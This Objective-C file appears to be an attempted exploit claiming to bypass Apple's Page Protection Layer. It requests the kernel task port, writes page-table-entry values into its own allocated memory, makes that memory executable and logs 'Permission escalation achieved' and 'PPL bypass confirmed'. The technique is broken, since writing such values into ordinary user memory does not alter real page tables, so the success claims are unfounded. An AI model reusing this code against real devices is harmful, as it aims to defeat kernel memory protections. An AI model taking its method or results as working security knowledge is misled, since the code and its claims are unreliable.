#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <sys/mman.h>

@implementation AttestationTest: NSObject

#define L1_SHIFT 30
#define L2_SHIFT 21
#define L3_SHIFT 14
#define PAGE_SHIFT 14
#define PAGE_SIZE (1ULL << PAGE_SHIFT)
#define L2_SIZE (1ULL << L2_SHIFT)
#define L3_SIZE (1ULL << L3_SHIFT)
#define L3_ENTRIES 128
#define TTE_SHIFT 3
#define TTE_MASK 0x7FF

+ (void)runTest {
    NSLog(@"[INFO] Starting PPL bypass using physical memory approach...");
    
    mach_port_t kernel_task = 0;
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &kernel_task);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[ERROR] Failed to get kernel task: %s", mach_error_string(kr));
        return;
    }
    
    vm_address_t base_addr = 0;
    vm_size_t alloc_size = L2_SIZE * 4;
    
    kr = vm_allocate(mach_task_self(), &base_addr, alloc_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[ERROR] Memory allocation failed: %s", mach_error_string(kr));
        return;
    }
    NSLog(@"[INFO] Memory allocated at 0x%llx", base_addr);
    
    @try {
        
        uint64_t l3_template = 0x60000000000003FFULL |
                              (1ULL << 10) |
                              (3ULL << 8) |
                              (1ULL << 54);
        
        
        vm_address_t phys_addr = base_addr & ~(L2_SIZE - 1);
        vm_address_t target = phys_addr + PAGE_SIZE;
        
        NSLog(@"[DEBUG] Physical address: 0x%llx, Target: 0x%llx", phys_addr, target);
        
        kr = vm_protect(mach_task_self(), target, PAGE_SIZE * 4, FALSE,
                       VM_PROT_READ | VM_PROT_WRITE);
        
        if (kr == KERN_SUCCESS) {
            NSLog(@"[INFO] Initial mapping successful");
            
            volatile uint64_t *tte = (uint64_t *)target;
            for (int i = 0; i < 8; i++) {
                uint64_t entry = l3_template | (phys_addr + (i * PAGE_SIZE));
                tte[i] = entry;
                __asm__ volatile("dmb ish" ::: "memory");
                NSLog(@"[DEBUG] Physical TTE[%d] = 0x%llx", i, entry);
            }
            
            kr = vm_protect(mach_task_self(), target, PAGE_SIZE * 4, FALSE,
                          VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
            
            if (kr == KERN_SUCCESS) {
                NSLog(@"[SUCCESS] Permission escalation achieved!");
                
                NSString *testPath = @"/private/var/mobile/test.txt";
                NSError *error = nil;
                [@"test" writeToFile:testPath atomically:YES encoding:NSUTF8StringEncoding error:&error];
                
                if (!error) {
                    NSLog(@"[SUCCESS] PPL bypass confirmed!");
                }
            }
        }
    } @catch (NSException *e) {
        NSLog(@"[ERROR] Exception: %@", e);
    }
    
    vm_deallocate(mach_task_self(), base_addr, alloc_size);
    mach_port_deallocate(mach_task_self(), kernel_task);
}

@end
